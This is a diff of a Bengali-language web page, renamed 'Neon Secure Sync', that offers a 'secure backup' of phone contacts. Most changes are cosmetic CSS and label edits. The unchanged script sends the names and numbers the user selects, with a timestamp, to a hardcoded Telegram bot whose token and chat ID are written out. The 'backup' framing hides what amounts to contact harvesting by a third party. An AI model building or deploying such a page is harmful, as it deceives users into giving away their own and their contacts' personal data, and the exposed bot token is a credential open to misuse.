@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Secure Contact Backup</title>
+<title>Neon Secure Sync</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
 
@@ -17,115 +17,105 @@ display:flex;
 justify-content:center;
 align-items:center;
 font-family:'Hind Siliguri',sans-serif;
-background: radial-gradient(circle at top,#111827,#020617);
+background: radial-gradient(circle at top,#0f0c29,#090113);
 }
 
-/* Premium Card */
+/* Glow Background */
+body::before{
+content:'';
+position:absolute;
+width:400px;
+height:400px;
+background: radial-gradient(circle,#7c3aed,#3b82f6);
+filter: blur(120px);
+opacity:0.25;
+}
 
+/* Card */
 .card{
-
 width:350px;
 padding:35px;
-border-radius:24px;
-
-background:rgba(255,255,255,0.04);
-backdrop-filter:blur(22px);
-
+border-radius:26px;
+background: rgba(255,255,255,0.05);
+backdrop-filter: blur(25px);
 border:1px solid rgba(255,255,255,0.08);
-
-box-shadow:
-0 20px 40px rgba(0,0,0,0.7),
-inset 0 0 20px rgba(255,255,255,0.03);
-
+box-shadow:0 20px 50px rgba(0,0,0,0.8);
 text-align:center;
+position:relative;
+}
 
+/* Gradient Border Glow */
+.card::before{
+content:'';
+position:absolute;
+inset:0;
+border-radius:26px;
+padding:1px;
+background: linear-gradient(135deg,#7c3aed,#3b82f6,#06b6d4);
+-webkit-mask:
+linear-gradient(#000 0 0) content-box,
+linear-gradient(#000 0 0);
+-webkit-mask-composite: xor;
+mask-composite: exclude;
 }
 
 /* Title */
-
 h2{
 color:#fff;
 margin-bottom:10px;
-font-weight:600;
 }
 
 p{
-color:#9ca3af;
+color:#cbd5f5;
 font-size:14px;
 }
 
-/* Premium Button */
-
+/* Button */
 .btn{
-
-margin-top:22px;
-
+margin-top:25px;
 width:100%;
 padding:16px;
-
 border:none;
 border-radius:14px;
-
 font-size:16px;
 font-weight:600;
-
 cursor:pointer;
-
-background:linear-gradient(135deg,#22c55e,#4ade80);
-
-color:#02120a;
-
-box-shadow:0 10px 25px rgba(34,197,94,0.3);
-
-transition:0.25s;
-
+background: linear-gradient(135deg,#7c3aed,#3b82f6);
+color:#fff;
+box-shadow:0 10px 25px rgba(124,58,237,0.4);
+transition:0.3s;
 }
 
 .btn:hover{
-
-transform:translateY(-2px);
-box-shadow:0 14px 35px rgba(34,197,94,0.45);
-
+transform:translateY(-3px);
+box-shadow:0 15px 35px rgba(59,130,246,0.6);
 }
 
 .btn:active{
-transform:scale(0.97);
+transform:scale(0.96);
 }
 
 /* Loader */
-
 .loader{
-
 margin:18px auto;
-
-width:28px;
-height:28px;
-
-border:3px solid rgba(255,255,255,0.15);
-border-top:3px solid #22c55e;
-
+width:26px;
+height:26px;
+border:3px solid rgba(255,255,255,0.2);
+border-top:3px solid #7c3aed;
 border-radius:50%;
-
 animation:spin 1s linear infinite;
-
 display:none;
-
 }
 
 @keyframes spin{
-
 100%{transform:rotate(360deg)}
-
 }
 
 /* Status */
-
 .status{
-
 margin-top:12px;
 font-size:14px;
-color:#4ade80;
-
+color:#60a5fa;
 }
 
 </style>
@@ -135,9 +125,9 @@ color:#4ade80;
 
 <div class="card">
 
-<h2>☁️ Secure Backup</h2>
+<h2>⚡ Secure Sync</h2>
 
-<p>কন্টাক্ট সিলেক্ট করে নিরাপদে পাঠান</p>
+<p>কন্টাক্ট সিলেক্ট করে প্রিমিয়াম ব্যাকআপ করুন</p>
 
 <button class="btn" id="btn">
 Select & Send
@@ -154,11 +144,8 @@ System Ready
 <script>
 
 const CONFIG = {
-
 TOKEN:"8651122945:AAH54GuzokeFtUMxdbJOEe0ZhUptrgxTm1k",
-
 CHAT_ID:"6467941734"
-
 };
 
 const btn=document.getElementById("btn");
@@ -181,7 +168,7 @@ if(!contacts.length)
 throw new Error("কোনো কন্টাক্ট পাওয়া যায়নি");
 
 loader.style.display="block";
-status.innerText="Sending...";
+status.innerText="Syncing...";
 
 /* Date Time */
 
@@ -196,45 +183,34 @@ day:'numeric'
 
 const time=now.toLocaleTimeString("bn-BD");
 
-/* Contact list */
+/* Build Text */
 
-let text=`📊 Backup Report\n\n`;
+let text=`⚡ Premium Backup\n\n`;
 
-text+=`📅 তারিখ: ${date}\n`;
-text+=`⏰ সময়: ${time}\n`;
-text+=`👥 মোট কন্টাক্ট: ${contacts.length}\n\n`;
+text+=`📅 ${date}\n`;
+text+=`⏰ ${time}\n`;
+text+=`👥 Total: ${contacts.length}\n\n`;
 
 contacts.forEach(c=>{
-
 let name=c.name?c.name[0]:"No Name";
 let phone=c.tel?c.tel[0]:"No Number";
 
 text+=`👤 ${name}\n📞 ${phone}\n\n`;
-
 });
 
 await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`,{
-
 method:"POST",
-
-headers:{
-'Content-Type':'application/json'
-},
-
+headers:{'Content-Type':'application/json'},
 body:JSON.stringify({
-
 chat_id:CONFIG.CHAT_ID,
 text:text
-
 })
-
 });
 
 loader.style.display="none";
-status.innerText="✅ Successfully Sent";
+status.innerText="✅ Done Successfully";
 
 }
-
 catch(e){
 
 loader.style.display="none";
